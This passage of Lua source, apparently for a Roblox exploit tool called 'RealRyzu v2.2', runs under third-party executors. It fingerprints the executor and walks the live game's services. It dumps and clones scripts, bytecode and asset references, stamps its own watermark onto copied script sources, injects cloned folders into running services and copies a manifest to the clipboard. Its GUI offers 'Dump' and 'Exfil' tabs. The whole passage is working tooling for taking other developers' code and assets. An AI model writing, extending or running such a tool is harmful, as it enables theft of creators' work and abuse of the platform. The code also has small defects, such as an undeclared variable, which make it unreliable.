    ["Comet"] = {markers = {"comet", "comet_"}, funcs = {}, wt = 3},
    ["Valyse"] = {markers = {"valyse", "val_"}, funcs = {}, wt = 3},
}

function ExecutorDetector:Detect()
    local scores = {}
    local env = getgenv and getgenv() or _G
    
    for name, data in pairs(self.Database) do
        local score = 0
        for _, m in ipairs(data.markers) do
            if rawget(env, m) then score = score + 2 end
            if rawget(_G, m) then score = score + 1 end
        end
        for _, fp in ipairs(data.funcs) do
            local parts = {}
            for p in fp:gmatch("[^%.]+") do table.insert(parts, p) end
            local t = env
            local ok = true
            for _, p in ipairs(parts) do
                if type(t) == "table" and rawget(t, p) then t = rawget(t, p)
                else ok = false; break end
            end
            if ok then score = score + 5 end
        end
        scores[name] = score * (data.wt / 10)
    end
    
    if getexecutorname then
        pcall(function()
            local n = getexecutorname()
            if n then
                for ename, _ in pairs(self.Database) do
                    if n:lower():find(ename:lower()) then
                        scores[ename] = (scores[ename] or 0) + 20
                    end
                end
            end
        end)
    end
    
    local best, bestScore = "Unknown Executor", 0
    for name, score in pairs(scores) do
        if score > bestScore then bestScore = score; bestName = name end
    end
    if bestScore < 1 then bestName = "Unknown/Low-Level" end
    
    return bestName, bestScore, scores
end

-- ═══════════════════════════════════════════════════════════════════════
-- LIVE GAME REBUILDER — CLONES INTO REAL SERVICES
-- ═══════════════════════════════════════════════════════════════════════
local GameRebuilder = {}
GameRebuilder.IsRunning = false
GameRebuilder.CancelRequested = false
GameRebuilder.IsPaused = false

GameRebuilder.Stats = {
    TotalObjects = 0, ClonedObjects = 0, TaggedScripts = 0,
    FailedClones = 0, StartTime = 0, CurrentItem = "",
}

GameRebuilder.PathMap = {} -- maps original fullname -> cloned instance

function GameRebuilder:CanClone(obj)
    if obj:IsA("ServiceProvider") and BLOCKED_SERVICES[obj.ClassName] then
        return false
    end
    if obj.ClassName:find("^Network") then return false end
    if obj.ClassName:find("^ScriptContext") then return false end
    if obj.ClassName:find("^LogService") then return false end
    if obj:IsA("ScreenGui") and obj:GetFullName():find("CoreGui") then return false end
    if obj:IsDescendantOf(Players) and not obj:IsA("Player") then return false end
    if obj:IsA("Terrain") then return false end
    if obj:IsA("Sky") or obj:IsA("Soundscape") then return false end
    return true
end

function GameRebuilder:CloneInstance(original, destParent, virtualFS, pathPrefix)
    if not self.IsRunning or self.CancelRequested then return nil end
    if not self:CanClone(original) then return nil end
    
    local instancePath = (pathPrefix or "") .. "/" .. original.Name
    self.Stats.CurrentItem = instancePath
    
    -- Check circular reference
    local originalFullName = original:GetFullName()
    if self.PathMap[originalFullName] then
        return self.PathMap[originalFullName] -- already cloned, return reference
    end
    
    local cloned = nil
    local className = original.ClassName
    
    -- Create the new instance
    local createSuccess = pcall(function()
        if className == "Script" or className == "LocalScript" or className == "ModuleScript" then
            cloned = Instance.new(className)
            -- Copy source with watermark
            local src = ""
            pcall(function() src = original.Source end)
            if src:find("RealRyzu", 1, true) then
                cloned.Source = src
            elseif src ~= "" then
                cloned.Source = RYZU_WATERMARK .. "\n" .. src
            else
                cloned.Source = RYZU_WATERMARK
            end
            self.Stats.TaggedScripts = self.Stats.TaggedScripts + 1
            
            -- Save to local FS
            local ext = className == "ModuleScript" and ".module.lua"
                    or className == "LocalScript" and ".client.lua"
                    or ".server.lua"
            local safe = instancePath:gsub("[^%w%./_%-]", "_"):gsub("^[/\\]+", "")
            virtualFS:WriteFile("RealRyzu_Game/Scripts/" .. safe .. ext, cloned.Source)
            
        elseif CLASS_PROPERTY_MAP[className] then
            cloned = Instance.new(className)
            -- Copy defined properties
            for _, prop in ipairs(CLASS_PROPERTY_MAP[className]) do
                pcall(function()
                    local val = original[prop]
                    if val ~= nil then
                        cloned[prop] = val
                    end
                end)
            end
            
            -- Save asset data for asset types
            if className == "MeshPart" then
                local info = {Name=original.Name, Path=instancePath, MeshId=tostring(original.MeshId),
                             TextureID=tostring(original.TextureID)}
                local safe = instancePath:gsub("[^%w%./_%-]", "_"):gsub("^[/\\]+", "")
                virtualFS:WriteFile("RealRyzu_Game/Meshes/" .. safe .. ".json",
                    WATERMARK_SHORT .. "\n" .. HttpService:JSONEncode(info))
            elseif className == "Sound" then
                local info = {Name=original.Name, Path=instancePath, SoundId=tostring(original.SoundId)}
                local safe = instancePath:gsub("[^%w%./_%-]", "_"):gsub("^[/\\]+", "")
                virtualFS:WriteFile("RealRyzu_Game/Sounds/" .. safe .. ".json",
                    WATERMARK_SHORT .. "\n" .. HttpService:JSONEncode(info))
            elseif className == "Decal" then
                local info = {Name=original.Name, Path=instancePath, Texture=tostring(original.Texture)}
                local safe = instancePath:gsub("[^%w%./_%-]", "_"):gsub("^[/\\]+", "")
                virtualFS:WriteFile("RealRyzu_Game/Decals/" .. safe .. ".json",
                    WATERMARK_SHORT .. "\n" .. HttpService:JSONEncode(info))
            elseif className == "ImageLabel" or className == "ImageButton" then
                local info = {Name=original.Name, Path=instancePath, Image=tostring(original.Image)}
                local safe = instancePath:gsub("[^%w%./_%-]", "_"):gsub("^[/\\]+", "")
                virtualFS:WriteFile("RealRyzu_Game/Images/" .. safe .. ".json",
                    WATERMARK_SHORT .. "\n" .. HttpService:JSONEncode(info))
            elseif className == "Animation" then
                local info = {Name=original.Name, Path=instancePath, AnimationId=tostring(original.AnimationId)}
                local safe = instancePath:gsub("[^%w%./_%-]", "_"):gsub("^[/\\]+", "")
                virtualFS:WriteFile("RealRyzu_Game/Animations/" .. safe .. ".json",
                    WATERMARK_SHORT .. "\n" .. HttpService:JSONEncode(info))
            elseif className == "VideoFrame" then
                local info = {Name=original.Name, Path=instancePath, Video=tostring(original.Video)}
                local safe = instancePath:gsub("[^%w%./_%-]", "_"):gsub("^[/\\]+", "")
                virtualFS:WriteFile("RealRyzu_Game/Videos/" .. safe .. ".json",
                    WATERMARK_SHORT .. "\n" .. HttpService:JSONEncode(info))
            end
            
        else
            -- Generic clone for anything not in the map
            cloned = original:Clone()
        end
        
        if cloned then
            cloned.Name = original.Name
            cloned.Parent = destParent
            
            -- Store in path map
            self.PathMap[originalFullName] = cloned
            
            self.Stats.ClonedObjects = self.Stats.ClonedObjects + 1
            
            -- Recurse children
            for _, child in ipairs(original:GetChildren()) do
                self:CloneInstance(child, cloned, virtualFS, instancePath)
            end
        end
    end)
    
    if not createSuccess then
        self.Stats.FailedClones = self.Stats.FailedClones + 1
        virtualFS:WriteFile("RealRyzu_Game/_Errors_/failed_clones.log",
            "[FAIL] " .. instancePath .. " (" .. className .. ")\n")
    end
    
    return cloned
end

function GameRebuilder:ExecuteFullRebuild(quickMode, dumpOnly, progressCallback)
    -- Reset state
    local virtualFS = VirtualFS
    virtualFS.Root = {}
    virtualFS.TotalFiles = 0
    virtualFS.TotalBytes = 0
    virtualFS.FileList = {}
    
    self.PathMap = {}
    self.Stats.TotalObjects = 0
    self.Stats.ClonedObjects = 0
    self.Stats.TaggedScripts = 0
    self.Stats.FailedClones = 0
    self.Stats.StartTime = tick()
    
    -- Count total objects
    local function countAll(parent)
        local c = 0
        for _, child in ipairs(parent:GetChildren()) do
            if self:CanClone(child) then
                c = c + 1 + countAll(child)
            end
        end
        return c
    end
    
    for _, target in ipairs(CLONE_TARGETS) do
        self.Stats.TotalObjects = self.Stats.TotalObjects + countAll(target.Source)
    end
    
    -- Save game metadata
    local meta = {
        PlaceId = game.PlaceId, GameId = game.GameId,
        PlaceVersion = game.PlaceVersion, JobId = game.JobId,
        Time = os.date("%Y-%m-%d %H:%M:%S"),
        TotalObjects = self.Stats.TotalObjects,
        Executor = ExecutorDetector:Detect(),
        Mode = dumpOnly and "DUMP ONLY" or (quickMode and "QUICK" or "FULL REBUILD"),
    }
    virtualFS:WriteFile("RealRyzu_Game/_Metadata_/game_info.json",
        WATERMARK_SHORT .. "\n" .. HttpService:JSONEncode(meta))
    
    -- Process each service — clone into REAL destination
    for _, target in ipairs(CLONE_TARGETS) do
        if not self.IsRunning or self.CancelRequested then break end
        
        -- Handle pause
        while self.IsPaused and not self.CancelRequested do
            task.wait(0.5)
        end
        
        -- Create a container folder in the REAL service
        local container = Instance.new("Folder")
        container.Name = "RealRyzu_" .. target.Name .. "_" .. os.time()
        container.Parent = target.Dest
        
        virtualFS:WriteFile("RealRyzu_Game/_Structure_/" .. target.Name .. "/.service",
            WATERMARK_SHORT .. "\nService: " .. target.Name .. "\nType: LIVE INJECTION\nCritical: " .. tostring(target.Critical))
        
        -- Clone all children
        for _, child in ipairs(target.Source:GetChildren()) do
            if not self.IsRunning or self.CancelRequested then break end
            
            while self.IsPaused and not self.CancelRequested do
                task.wait(0.5)
            end
            
            if not dumpOnly then
                self:CloneInstance(child, container, virtualFS, target.Name)
            else
                -- Dump only: extract scripts to filesystem
                if child:IsA("Script") or child:IsA("LocalScript") or child:IsA("ModuleScript") then
                    local src = ""
                    pcall(function() src = child.Source end)
                    if src ~= "" then
                        local tagged = src:find("RealRyzu", 1, true) and src or (RYZU_WATERMARK .. "\n" .. src)
                        local ext = child:IsA("ModuleScript") and ".module.lua"
                                or child:IsA("LocalScript") and ".client.lua"
                                or ".server.lua"
                        local safe = (target.Name .. "/" .. child.Name):gsub("[^%w%./_%-]", "_"):gsub("^[/\\]+", "")
                        virtualFS:WriteFile("RealRyzu_Game/Scripts/" .. safe .. ext, tagged)
                        self.Stats.TaggedScripts = self.Stats.TaggedScripts + 1
                    end
                end
                self.Stats.ClonedObjects = self.Stats.ClonedObjects + 1
            end
            
            -- Yield for stability
            if self.Stats.ClonedObjects % 20 == 0 then
                task.wait()
                if progressCallback then
                    local pct = self.Stats.TotalObjects > 0
                        and (self.Stats.ClonedObjects / self.Stats.TotalObjects) * 100 or 0
                    progressCallback(math.min(pct, 100))
                end
            end
        end
    end
    
    -- Generate manifest
    local manifest = virtualFS:GetManifest()
    virtualFS:WriteFile("RealRyzu_Game/_MANIFEST_.lua", manifest)
    pcall(function() setclipboard(manifest) end)
    
    local elapsed = tick() - self.Stats.StartTime
    
    return {
        TotalObjects = self.Stats.TotalObjects,
        ClonedObjects = self.Stats.ClonedObjects,
        TaggedScripts = self.Stats.TaggedScripts,
        FailedClones = self.Stats.FailedClones,
        TotalFiles = virtualFS.TotalFiles,
        TotalBytes = virtualFS.TotalBytes,
        ElapsedTime = elapsed,
        Manifest = manifest,
        VirtualFS = virtualFS,
    }
end

-- ═══════════════════════════════════════════════════════════════════════
-- GUI CONSTRUCTION
-- ═══════════════════════════════════════════════════════════════════════
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "RealRyzu_v2_2"
ScreenGui.Parent = CoreGui
ScreenGui.ResetOnSpawn = false
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

local MainFrame = Instance.new("Frame")
MainFrame.Size = UDim2.new(0, 710, 0, 510)
MainFrame.Position = UDim2.new(0.5, -355, 0.5, -255)
MainFrame.BackgroundColor3 = Color3.fromRGB(5, 5, 11)
MainFrame.BorderSizePixel = 0
MainFrame.Active = true
MainFrame.Draggable = true
MainFrame.Parent = ScreenGui

-- Glow border
local Glow = Instance.new("Frame")
Glow.Size = UDim2.new(1, 8, 1, 8)
Glow.Position = UDim2.new(0, -4, 0, -4)
Glow.BackgroundTransparency = 1
Glow.BorderSizePixel = 0
Glow.Parent = MainFrame

for _, edge in ipairs({"Top", "Bottom", "Left", "Right"}) do
    local bar = Instance.new("Frame")
    if edge == "Top" or edge == "Bottom" then
        bar.Size = UDim2.new(1, 0, 0, 3)
        if edge == "Bottom" then bar.Position = UDim2.new(0, 0, 1, 0) end
    else
        bar.Size = UDim2.new(0, 3, 1, 0)
        if edge == "Right" then bar.Position = UDim2.new(1, 0, 0, 0) end
    end
    bar.BackgroundColor3 = edge == "Top" and Color3.fromRGB(0, 200, 255)
                        or edge == "Bottom" and Color3.fromRGB(0, 170, 220)
                        or Color3.fromRGB(0, 160, 210)
    bar.BorderSizePixel = 0
    bar.Parent = Glow
end

-- Title bar
local TitleBar = Instance.new("Frame")
TitleBar.Size = UDim2.new(1, 0, 0, 48)
TitleBar.BackgroundColor3 = Color3.fromRGB(8, 8, 18)
TitleBar.BorderSizePixel = 0
TitleBar.Parent = MainFrame

local TitleIcon = Instance.new("TextLabel")
TitleIcon.Text = "⬡"
TitleIcon.Size = UDim2.new(0, 34, 0, 34)
TitleIcon.Position = UDim2.new(0, 10, 0, 7)
TitleIcon.BackgroundTransparency = 1
TitleIcon.TextColor3 = Color3.fromRGB(0, 215, 255)
TitleIcon.Font = Enum.Font.Code
TitleIcon.TextSize = 26
TitleIcon.Parent = TitleBar

local TitleMain = Instance.new("TextLabel")
TitleMain.Text = "REALRYZU v2.2"
TitleMain.Size = UDim2.new(0, 200, 0, 20)
TitleMain.Position = UDim2.new(0, 50, 0, 4)
TitleMain.BackgroundTransparency = 1
TitleMain.TextColor3 = Color3.fromRGB(240, 240, 255)
TitleMain.Font = Enum.Font.Code
TitleMain.TextSize = 17
TitleMain.TextXAlignment = Enum.TextXAlignment.Left
TitleMain.Parent = TitleBar

local TitleSub = Instance.new("TextLabel")
TitleSub.Text = "LIVE GAME REBUILDER — CLONES INTO REAL SERVICES"
TitleSub.Size = UDim2.new(0, 350, 0, 14)
TitleSub.Position = UDim2.new(0, 50, 0, 26)
TitleSub.BackgroundTransparency = 1
TitleSub.TextColor3 = Color3.fromRGB(0, 180, 230)
TitleSub.Font = Enum.Font.Code
TitleSub.TextSize = 9
TitleSub.TextXAlignment = Enum.TextXAlignment.Left
TitleSub.Parent = TitleBar

local ExecLabel = Instance.new("TextLabel")
ExecLabel.Size = UDim2.new(0, 220, 0, 14)
ExecLabel.Position = UDim2.new(1, -280, 0, 4)
ExecLabel.BackgroundTransparency = 1
ExecLabel.TextColor3 = Color3.fromRGB(105, 215, 105)
ExecLabel.Font = Enum.Font.Code
ExecLabel.TextSize = 9
ExecLabel.TextXAlignment = Enum.TextXAlignment.Right
ExecLabel.Text = "Executor: Detecting..."
ExecLabel.Parent = TitleBar

local GameLabel = Instance.new("TextLabel")
GameLabel.Size = UDim2.new(0, 220, 0, 14)
GameLabel.Position = UDim2.new(1, -280, 0, 22)
GameLabel.BackgroundTransparency = 1
GameLabel.TextColor3 = Color3.fromRGB(140, 140, 165)
GameLabel.Font = Enum.Font.Code
GameLabel.TextSize = 8
GameLabel.TextXAlignment = Enum.TextXAlignment.Right
GameLabel.Text = "Game: " .. (game.PlaceId or "N/A")
GameLabel.Parent = TitleBar

local CloseBtn = Instance.new("TextButton")
CloseBtn.Text = "×"
CloseBtn.Size = UDim2.new(0, 38, 0, 38)
CloseBtn.Position = UDim2.new(1, -42, 0, 5)
CloseBtn.BackgroundColor3 = Color3.fromRGB(20, 20, 38)
CloseBtn.TextColor3 = Color3.fromRGB(255, 115, 115)
CloseBtn.Font = Enum.Font.Code
CloseBtn.TextSize = 24
CloseBtn.BorderSizePixel = 0
CloseBtn.Parent = TitleBar
CloseBtn.MouseButton1Click:Connect(function()
    if GameRebuilder.IsRunning then GameRebuilder.CancelRequested = true
    else ScreenGui:Destroy() end
end)

local MinBtn = Instance.new("TextButton")
MinBtn.Text = "─"
MinBtn.Size = UDim2.new(0, 38, 0, 38)
MinBtn.Position = UDim2.new(1, -84, 0, 5)
MinBtn.BackgroundColor3 = Color3.fromRGB(20, 20, 38)
MinBtn.TextColor3 = Color3.fromRGB(200, 200, 215)
MinBtn.Font = Enum.Font.Code
MinBtn.TextSize = 20
MinBtn.BorderSizePixel = 0
MinBtn.Parent = TitleBar

local minimized = false
MinBtn.MouseButton1Click:Connect(function()
    minimized = not minimized
    for _, child in ipairs(MainFrame:GetChildren()) do
        if child ~= TitleBar and child ~= Glow then
            child.Visible = not minimized
        end
    end
end)

-- Tab bar
local TabBar = Instance.new("Frame")
TabBar.Size = UDim2.new(1, 0, 0, 32)
TabBar.Position = UDim2.new(0, 0, 0, 48)
TabBar.BackgroundColor3 = Color3.fromRGB(10, 10, 20)
TabBar.BorderSizePixel = 0
TabBar.Parent = MainFrame

local Tabs = {}
local TabNames = {"Rebuild", "Dump", "Assets", "Executor", "Exfil", "Settings"}
local ActiveTab = "Rebuild"

local function MakeTab(name, pos)
    local btn = Instance.new("TextButton")
    btn.Text = name
    btn.Size = UDim2.new(0, 110, 1, 0)
    btn.Position = UDim2.new(0, pos * 112, 0, 0)
    btn.BackgroundColor3 = Color3.fromRGB(14, 14, 28)
    btn.TextColor3 = Color3.fromRGB(180, 180, 200)
    btn.Font = Enum.Font.Code
    btn.TextSize = 10
    btn.BorderSizePixel = 0
    btn.Parent = TabBar
    
    btn.MouseButton1Click:Connect(function()
        ActiveTab = name
        for _, t in pairs(Tabs) do
            t.BackgroundColor3 = Color3.fromRGB(14, 14, 28)
            t.TextColor3 = Color3.fromRGB(180, 180, 200)
        end
        btn.BackgroundColor3 = Color3.fromRGB(0, 160, 235)
        btn.TextColor3 = Color3.fromRGB(255, 255, 255)
        UpdatePages()
    end)
    
    Tabs[name] = btn
    return btn
end

for i, name in ipairs(TabNames) do MakeTab(name, i-1) end
Tabs["Rebuild"].BackgroundColor3 = Color3.fromRGB(0, 160, 235)
Tabs["Rebuild"].TextColor3 = Color3.fromRGB(255, 255, 255)

-- Content area
local ContentArea = Instance.new("Frame")
ContentArea.Size = UDim2.new(1, -16, 0, 235)
ContentArea.Position = UDim2.new(0, 8, 0, 84)
ContentArea.BackgroundTransparency = 1
ContentArea.BorderSizePixel = 0
ContentArea.Parent = MainFrame

local Pages = {}
local function CreatePage(name)
    local page = Instance.new("Frame")
    page.Size = UDim2.new(1, 0, 1, 0)
    page.BackgroundTransparency = 1
    page.BorderSizePixel = 0
    page.Visible = false
    page.Parent = ContentArea
    Pages[name] = page
    return page
end

function UpdatePages()
    for name, page in pairs(Pages) do page.Visible = (name == ActiveTab) end
end

-- ═══════════════════════════════════════════════════════════════════════
-- REBUILD PAGE
-- ═══════════════════════════════════════════════════════════════════════
local RebuildPage = CreatePage("Rebuild")

local GameInfoText = Instance.new("TextLabel")
GameInfoText.Size = UDim2.new(1, 0, 0, 16)
GameInfoText.Position = UDim2.new(0, 0, 0, 2)
GameInfoText.BackgroundTransparency = 1
GameInfoText.TextColor3 = Color3.fromRGB(130, 130, 160)
GameInfoText.Font = Enum.Font.Code
GameInfoText.TextSize = 9
GameInfoText.TextXAlignment = Enum.TextXAlignment.Left
GameInfoText.Text = "Target: " .. (game.PlaceId ~= 0 and ("roblox.com/games/" .. game.PlaceId) or "Local")
GameInfoText.Parent = RebuildPage

local StatusText = Instance.new("TextLabel")
StatusText.Size = UDim2.new(1, 0, 0, 16)
StatusText.Position = UDim2.new(0, 0, 0, 20)
StatusText.BackgroundTransparency = 1
StatusText.TextColor3 = Color3.fromRGB(0, 225, 160)
StatusText.Font = Enum.Font.Code
StatusText.TextSize = 11
StatusText.TextXAlignment = Enum.TextXAlignment.Left
StatusText.Text = "STATUS: Ready — awaiting rebuild command"
StatusText.Parent = RebuildPage

local CurrentObjText = Instance.new("TextLabel")
CurrentObjText.Size = UDim2.new(1, 0, 0, 14)
CurrentObjText.Position = UDim2.new(0, 0, 0, 38)
CurrentObjText.BackgroundTransparency = 1
CurrentObjText.TextColor3 = Color3.fromRGB(95, 95, 120)
CurrentObjText.Font = Enum.Font.Code
CurrentObjText.TextSize = 8
CurrentObjText.TextXAlignment = Enum.TextXAlignment.Left
CurrentObjText.TextTruncate = Enum.TextTruncate.AtEnd
CurrentObjText.Text = "Current: ..."
CurrentObjText.Parent = RebuildPage

local BigPercent = Instance.new("TextLabel")
BigPercent.Size = UDim2.new(1, 0, 0, 50)
BigPercent.Position = UDim2.new(0, 0, 0, 56)
BigPercent.BackgroundTransparency = 1
BigPercent.TextColor3 = Color3.fromRGB(0, 250, 180)
BigPercent.Font = Enum.Font.Code
BigPercent.TextSize = 42
BigPercent.Text = "0.0%"
BigPercent.TextXAlignment = Enum.TextXAlignment.Center
BigPercent.Parent = RebuildPage

local ProgBg = Instance.new("Frame")
ProgBg.Size = UDim2.new(1, 0, 0, 18)
ProgBg.Position = UDim2.new(0, 0, 0, 110)
ProgBg.BackgroundColor3 = Color3.fromRGB(12, 12, 24)
ProgBg.BorderSizePixel = 0
ProgBg.Parent = RebuildPage

local ProgFill = Instance.new("Frame")
ProgFill.Size = UDim2.new(0, 0, 1, 0)
ProgFill.BackgroundColor3 = Color3.fromRGB(0, 190, 245)
ProgFill.BorderSizePixel = 0
ProgFill.Parent = ProgBg

local ProgGlow = Instance.new("Frame")
ProgGlow.Size = UDim2.new(0, 4, 1, 0)
ProgGlow.Position = UDim2.new(1, -4, 0, 0)
ProgGlow.BackgroundColor3 = Color3.fromRGB(130, 225, 255)
ProgGlow.BorderSizePixel = 0
ProgGlow.BackgroundTransparency = 0.35
ProgGlow.Parent = ProgFill

local StatsRow = Instance.new("TextLabel")
StatsRow.Size = UDim2.new(1, 0, 0, 18)
StatsRow.Position = UDim2.new(0, 0, 0, 132)
StatsRow.BackgroundTransparency = 1
StatsRow.TextColor3 = Color3.fromRGB(165, 165, 190)
StatsRow.Font = Enum.Font.Code
StatsRow.TextSize = 9
StatsRow.Text = "Objects: 0/0 | Scripts tagged: 0 | Failed: 0 | ETA: --:--"
StatsRow.TextXAlignment = Enum.TextXAlignment.Center
StatsRow.Parent = RebuildPage

local FSStats = Instance.new("TextLabel")
FSStats.Size = UDim2.new(1, 0, 0, 16)
FSStats.Position = UDim2.new(0, 0, 0, 152)
FSStats.BackgroundTransparency = 1
FSStats.TextColor3 = Color3.fromRGB(105, 215, 105)
FSStats.Font = Enum.Font.Code
FSStats.TextSize = 9
FSStats.Text = "💾 Local Files: 0 | Size: 0 KB"
FSStats.TextXAlignment = Enum.TextXAlignment.Center
FSStats.Parent = RebuildPage

-- Service status indicators
local ServiceStatusFrame = Instance.new("Frame")
ServiceStatusFrame.Size = UDim2.new(1, 0, 0, 20)
ServiceStatusFrame.Position = UDim2.new(0, 0, 0, 172)
ServiceStatusFrame.BackgroundTransparency = 1
ServiceStatusFrame.BorderSizePixel = 0
ServiceStatusFrame.Parent = RebuildPage

local serviceStatusLabels = {}
for i, target in ipairs(CLONE_TARGETS) do
    if i <= 7 then -- show first 7
        local lbl = Instance.new("TextLabel")
        lbl.Size = UDim2.new(0, 94, 0, 18)
        lbl.Position = UDim2.new(0, (i-1)*98, 0, 0)
        lbl.BackgroundColor3 = Color3.fromRGB(14, 14, 24)
        lbl.TextColor3 = Color3.fromRGB(120, 120, 145)
        lbl.Font = Enum.Font.Code
        lbl.TextSize = 7
        lbl.Text = "○ " .. target.Name:sub(1, 12)
        lbl.BorderSizePixel = 0
        lbl.Parent = ServiceStatusFrame
        serviceStatusLabels[target.Name] = lbl
    end
end

local RebuildFullBtn = Instance.new("TextButton")
RebuildFullBtn.Size = UDim2.new(0, 160, 0, 32)
RebuildFullBtn.Position = UDim2.new(0, 0, 0, 196)
RebuildFullBtn.BackgroundColor3 = Color3.fromRGB(0, 150, 240)
RebuildFullBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
RebuildFullBtn.Font = Enum.Font.Code
RebuildFullBtn.TextSize = 11
RebuildFullBtn.Text = "🔴 REBUILD GAME"
RebuildFullBtn.BorderSizePixel = 0
RebuildFullBtn.Parent = RebuildPage

local RebuildQuickBtn = Instance.new("TextButton")
RebuildQuickBtn.Size = UDim2.new(0, 130, 0, 32)
RebuildQuickBtn.Position = UDim2.new(0, 166, 0, 196)
RebuildQuickBtn.BackgroundColor3 = Color3.fromRGB(0, 90, 160)
RebuildQuickBtn.TextColor3 = Color3.fromRGB(145, 250, 165)
RebuildQuickBtn.Font = Enum.Font.Code
RebuildQuickBtn.TextSize = 10
RebuildQuickBtn.Text = "⚡ QUICK"
RebuildQuickBtn.BorderSizePixel = 0
RebuildQuickBtn.Parent = RebuildPage

local DumpOnlyButton = Instance.new("TextButton")
DumpOnlyButton.Size = UDim2.new(0, 130, 0, 32)
DumpOnlyButton.Position = UDim2.new(0, 302, 0, 196)
DumpOnlyButton.BackgroundColor3 = Color3.fromRGB(0, 70, 130)
DumpOnlyButton.TextColor3 = Color3.fromRGB(185, 210, 250)
DumpOnlyButton.Font = Enum.Font.Code
DumpOnlyButton.TextSize = 10
DumpOnlyButton.Text = "📋 DUMP ONLY"
DumpOnlyButton.BorderSizePixel = 0
DumpOnlyButton.Parent = RebuildPage

local PauseButton = Instance.new("TextButton")
PauseButton.Size = UDim2.new(0, 100, 0, 32)
PauseButton.Position = UDim2.new(0, 438, 0, 196)
PauseButton.BackgroundColor3 = Color3.fromRGB(30, 30, 50)
PauseButton.TextColor3 = Color3.fromRGB(225, 210, 55)
PauseButton.Font = Enum.Font.Code
PauseButton.TextSize = 10
PauseButton.Text = "⏸ PAUSE"
PauseButton.BorderSizePixel = 0
PauseButton.Parent = RebuildPage

local CancelButton = Instance.new("TextButton")
CancelButton.Size = UDim2.new(0, 100, 0, 32)
CancelButton.Position = UDim2.new(0, 544, 0, 196)
CancelButton.BackgroundColor3 = Color3.fromRGB(52, 18, 18)
CancelButton.TextColor3 = Color3.fromRGB(255, 90, 90)
CancelButton.Font = Enum.Font.Code
CancelButton.TextSize = 10
CancelButton.Text = "✕ CANCEL"
CancelButton.BorderSizePixel = 0
CancelButton.Parent = RebuildPage

local OutputInfo = Instance.new("TextLabel")
OutputInfo.Size = UDim2.new(1, 0, 0, 14)
OutputInfo.Position = UDim2.new(0, 0, 0, 232)
OutputInfo.BackgroundTransparency = 1
OutputInfo.TextColor3 = Color3.fromRGB(110, 185, 225)
OutputInfo.Font = Enum.Font.Code
OutputInfo.TextSize = 8
OutputInfo.Text = "Output: REAL services (game runs) + Local filesystem (backup)"
OutputInfo.TextXAlignment = Enum.TextXAlignment.Center
OutputInfo.Parent = RebuildPage

-- ═══════════════════════════════════════════════════════════════════════
-- DUMP PAGE
-- ═══════════════════════════════════════════════════════════════════════
local DumpPage = CreatePage("Dump")

local DumpModeLabel = Instance.new("TextLabel")
DumpModeLabel.Size = UDim2.new(1, 0, 0, 14)
DumpModeLabel.Position = UDim2.new(0, 0, 0, 4)
DumpModeLabel.BackgroundTransparency = 1
DumpModeLabel.TextColor3 = Color3.fromRGB(165, 210, 230)
DumpModeLabel.Font = Enum.Font.Code
DumpModeLabel.TextSize = 10
DumpModeLabel.Text = "Script Dump Mode:"
DumpModeLabel.TextXAlignment = Enum.TextXAlignment.Left
DumpModeLabel.Parent = DumpPage

local dumpModes = {"ALL SCRIPTS", "SCRIPTS ONLY", "LOCALSCRIPTS ONLY", "MODULE SCRIPTS", "WITH BYTECODE"}
local dumpIdx = 1
local DumpModeBtn = Instance.new("TextButton")
DumpModeBtn.Size = UDim2.new(1, 0, 0, 26)
DumpModeBtn.Position = UDim2.new(0, 0, 0, 20)
DumpModeBtn.BackgroundColor3 = Color3.fromRGB(15, 15, 28)
DumpModeBtn.TextColor3 = Color3.fromRGB(200, 200, 230)
DumpModeBtn.Font = Enum.Font.Code
DumpModeBtn.TextSize = 10
DumpModeBtn.Text = "Mode: ALL SCRIPTS ▼"
DumpModeBtn.BorderSizePixel = 0
DumpModeBtn.Parent = DumpPage
DumpModeBtn.MouseButton1Click:Connect(function()
    dumpIdx = (dumpIdx % #dumpModes) + 1
    DumpModeBtn.Text = "Mode: " .. dumpModes[dumpIdx] .. " ▼"
end)

local DumpCount = Instance.new("TextLabel")
DumpCount.Size = UDim2.new(1, 0, 0, 14)
DumpCount.Position = UDim2.new(0, 0, 0, 52)
DumpCount.BackgroundTransparency = 1
DumpCount.TextColor3 = Color3.fromRGB(125, 215, 145)
DumpCount.Font = Enum.Font.Code
DumpCount.TextSize = 10
DumpCount.Text = "Scripts found: 0"
DumpCount.TextXAlignment = Enum.TextXAlignment.Left
DumpCount.Parent = DumpPage

local DumpClipBtn = Instance.new("TextButton")
DumpClipBtn.Size = UDim2.new(0, 215, 0, 26)
DumpClipBtn.Position = UDim2.new(0, 0, 0, 72)
DumpClipBtn.BackgroundColor3 = Color3.fromRGB(0, 110, 190)
DumpClipBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
DumpClipBtn.Font = Enum.Font.Code
DumpClipBtn.TextSize = 10
DumpClipBtn.Text = "📋 DUMP TO CLIPBOARD"
DumpClipBtn.BorderSizePixel = 0
DumpClipBtn.Parent = DumpPage

local DumpSaveBtn = Instance.new("TextButton")
DumpSaveBtn.Size = UDim2.new(0, 215, 0, 26)
DumpSaveBtn.Position = UDim2.new(0, 223, 0, 72)
DumpSaveBtn.BackgroundColor3 = Color3.fromRGB(0, 80, 145)
DumpSaveBtn.TextColor3 = Color3.fromRGB(210, 230, 255)
DumpSaveBtn.Font = Enum.Font.Code
DumpSaveBtn.TextSize = 10
DumpSaveBtn.Text = "💾 SAVE TO LOCAL"
DumpSaveBtn.BorderSizePixel = 0
DumpSaveBtn.Parent = DumpPage

local DumpByteBtn = Instance.new("TextButton")
DumpByteBtn.Size = UDim2.new(0, 215, 0, 26)
DumpByteBtn.Position = UDim2.new(0, 0, 0, 104)
DumpByteBtn.BackgroundColor3 = Color3.fromRGB(65, 25, 110)
DumpByteBtn.TextColor3 = Color3.fromRGB(210, 190, 255)
DumpByteBtn.Font = Enum.Font.Code
DumpByteBtn.TextSize = 10
DumpByteBtn.Text = "🔐 DUMP + BYTECODE"
DumpByteBtn.BorderSizePixel = 0
DumpByteBtn.Parent = DumpPage

local ManifestBtn = Instance.new("TextButton")
ManifestBtn.Size = UDim2.new(0, 215, 0, 26)
ManifestBtn.Position = UDim2.new(0, 223, 0, 104)
ManifestBtn.BackgroundColor3 = Color3.fromRGB(45, 18, 80)
ManifestBtn.TextColor3 = Color3.fromRGB(190, 170, 230)
ManifestBtn.Font = Enum.Font.Code
ManifestBtn.TextSize = 10
ManifestBtn.Text = "📄 GENERATE MANIFEST"
